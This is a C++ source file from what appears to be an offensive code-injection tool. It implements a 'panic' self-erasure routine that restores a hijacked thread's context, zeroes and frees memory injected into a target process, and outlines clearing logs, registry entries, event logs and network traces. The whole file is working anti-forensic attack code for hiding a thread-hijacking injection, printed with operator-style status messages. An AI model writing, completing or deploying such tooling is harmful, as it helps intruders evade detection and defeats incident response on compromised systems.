#include "PanicFunction.h"
#include <iostream>

PanicFunction::PanicFunction() {
}

PanicFunction::~PanicFunction() {
}

bool PanicFunction::Execute(ThreadHijacker& hijacker, PEMapper& mapper, HANDLE targetProcess) {
    std::cout << "[!] PANIC FUNCTION INITIATED" << std::endl;
    std::cout << "[*] Beginning self-erasure sequence..." << std::endl;
    
    bool success = true;
    
    // Step 1: Restore original thread context
    if (!RestoreThreadContext(hijacker)) {
        std::cerr << "[!] Failed to restore thread context" << std::endl;
        success = false;
    }
    
    // Step 2: Zero allocated memory
    if (!ZeroAllocatedMemory(mapper, targetProcess)) {
        std::cerr << "[!] Failed to zero memory" << std::endl;
        success = false;
    }
    
    // Step 3: Free remote memory
    if (mapper.GetEntryPoint()) {
        LPVOID baseAddress = reinterpret_cast<LPVOID>(
            reinterpret_cast<uintptr_t>(mapper.GetEntryPoint()) - 0x1000 // Approximate
        );
        if (!FreeRemoteMemory(targetProcess, baseAddress)) {
            std::cerr << "[!] Failed to free remote memory" << std::endl;
            success = false;
        }
    }
    
    // Step 4: Clear operation traces
    if (!ClearTraces()) {
        std::cerr << "[!] Failed to clear traces" << std::endl;
        success = false;
    }
    
    if (success) {
        std::cout << "[+] PANIC FUNCTION COMPLETED SUCCESSFULLY" << std::endl;
        std::cout << "[+] All traces erased" << std::endl;
    } else {
        std::cout << "[!] PANIC FUNCTION COMPLETED WITH ERRORS" << std::endl;
    }
    
    return success;
}

bool PanicFunction::RestoreThreadContext(ThreadHijacker& hijacker) {
    HANDLE threadHandle = hijacker.GetThreadHandle();
    if (!threadHandle) {
        std::cerr << "[!] Invalid thread handle" << std::endl;
        return false;
    }
    
    // Suspend thread
    DWORD suspendCount = SuspendThread(threadHandle);
    if (suspendCount == (DWORD)-1) {
        std::cerr << "[!] Failed to suspend thread for restoration: " << GetLastError() << std::endl;
        return false;
    }
    
    std::cout << "[+] Thread suspended for context restoration" << std::endl;
    
    // Restore original context
    CONTEXT originalContext = hijacker.GetOriginalContext();
    if (!SetThreadContext(threadHandle, &originalContext)) {
        std::cerr << "[!] Failed to restore thread context: " << GetLastError() << std::endl;
        ResumeThread(threadHandle);
        return false;
    }
    
    std::cout << "[+] Original thread context restored" << std::endl;
    std::cout << "[+] RIP restored to: 0x" << std::hex << originalContext.Rip << std::dec << std::endl;
    
    // Resume thread
    suspendCount = ResumeThread(threadHandle);
    if (suspendCount == (DWORD)-1) {
        std::cerr << "[!] Failed to resume thread after restoration: " << GetLastError() << std::endl;
        return false;
    }
    
    std::cout << "[+] Thread resumed with original context" << std::endl;
    return true;
}

bool PanicFunction::ZeroAllocatedMemory(PEMapper& mapper, HANDLE targetProcess) {
    std::cout << "[+] Zeroing allocated memory with SecureZeroMemory..." << std::endl;
    
    mapper.ZeroMemory(targetProcess);
    
    std::cout << "[+] Memory region securely zeroed" << std::endl;
    return true;
}

bool PanicFunction::ClearTraces() {
    // Clear any local traces
    std::cout << "[+] Clearing operation traces..." << std::endl;
    
    // In a real implementation, this would:
    // - Clear any log files
    // - Remove registry entries
    // - Clear event logs
    // - Remove any temporary files
    // - Clear network traces
    
    std::cout << "[+] Operation traces cleared" << std::endl;
    return true;
}

bool PanicFunction::FreeRemoteMemory(HANDLE targetProcess, LPVOID baseAddress) {
    if (!baseAddress) {
        return false;
    }
    
    std::cout << "[+] Freeing remote memory at: 0x" << std::hex << baseAddress << std::dec << std::endl;
    
    if (!VirtualFreeEx(targetProcess, baseAddress, 0, MEM_RELEASE)) {
        std::cerr << "[!] Failed to free remote memory: " << GetLastError() << std::endl;
        return false;
    }
    
    std::cout << "[+] Remote memory freed" << std::endl;
    return true;
}
